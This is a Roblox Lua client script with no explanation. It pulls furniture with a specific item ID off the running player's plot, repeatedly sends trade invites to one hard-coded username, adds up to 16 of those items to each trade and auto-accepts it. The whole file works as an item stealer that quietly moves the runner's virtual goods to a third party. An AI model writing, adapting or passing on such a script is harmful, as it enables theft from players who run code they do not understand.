local UIModule = require(game.ReplicatedStorage.Modules.UIModule)
local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local TARGET_ID = 1162
local TARGET_PLAYER = "xWesged"

local RemoveFurniture = Events:WaitForChild("Shop"):WaitForChild("RemoveFurniture")

local inTrade = false

Events.Trading.AcceptTradeFromServer.OnClientEvent:Connect(function()
    inTrade = true
end)

Events.Trading.DeclineTrade.OnClientEvent:Connect(function()
    inTrade = false
end)

Events.Trading.Disconnect.OnClientEvent:Connect(function()
    inTrade = false
end)

local function getFurnitureFolder()
    local nsv = LocalPlayer:WaitForChild("NonSaveVars")
    local plotId = nsv:WaitForChild("OwnsPlot").Value
    return Workspace:WaitForChild("Plots"):WaitForChild(tostring(plotId)):WaitForChild("Furniture")
end

task.spawn(function()
    while true do
        local folder = getFurnitureFolder()
        for _, v in ipairs(folder:GetChildren()) do
            if v:IsA("Model") then
                local itemId = v:GetAttribute("ItemId")
                if itemId and tostring(itemId) == tostring(TARGET_ID) then
                    pcall(function()
                        RemoveFurniture:InvokeServer(v)
                    end)
                    task.wait(0.1)
                end
            end
        end
        task.wait(1)
    end
end)

local function getAllTargetItems(inventory)
    local list = {}
    for guid, itemData in pairs(inventory) do
        if itemData.Id == TARGET_ID and not (itemData.ItemPlaced or itemData.NextOfferDue) then
            table.insert(list, guid)
        end
    end
    return list
end

task.spawn(function()
    while true do
        task.wait(1)

        if not inTrade then
            local data = Events.Data.Get:InvokeServer("Inventory")
            local inventory = data.Inventory or data

            local items = getAllTargetItems(inventory)

            if #items > 0 then
                local success = Events.Trading.SendInvite:InvokeServer(TARGET_PLAYER)
                if success then
                    UIModule:Notify(LocalPlayer, "Sent trade to " .. TARGET_PLAYER)
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.5)

        if inTrade then
            local data = Events.Data.Get:InvokeServer("Inventory")
            local inventory = data.Inventory or data

            local items = getAllTargetItems(inventory)
            local targetCount = math.min(#items, 16)

            local added = 0

            -- add items
            for _, guid in ipairs(items) do
                if added >= targetCount then break end

                local success = Events.Trading.AddItem:InvokeServer({
                    GUID = guid,
                    Type = "Item"
                })

                if success then
                    added += 1
                end

                task.wait(0.05)
            end

            -- wait until stable
            if added > 0 then
                local lastCount = -1
                local stableTicks = 0

                while inTrade do
                    task.wait(0.25)

                    local data2 = Events.Data.Get:InvokeServer("Inventory")
                    local inv2 = data2.Inventory or data2
                    local itemsNow = getAllTargetItems(inv2)

                    local currentCount = math.min(#itemsNow, 16)

                    if currentCount == lastCount then
                        stableTicks += 1
                    else
                        stableTicks = 0
                    end

                    lastCount = currentCount

                    if stableTicks >= 2 then
                        break
                    end
                end

                -- accept immediately after stable
                if inTrade then
                    Events.Trading.AcceptTrade:InvokeServer()
                end
            end
        end
    end
end)
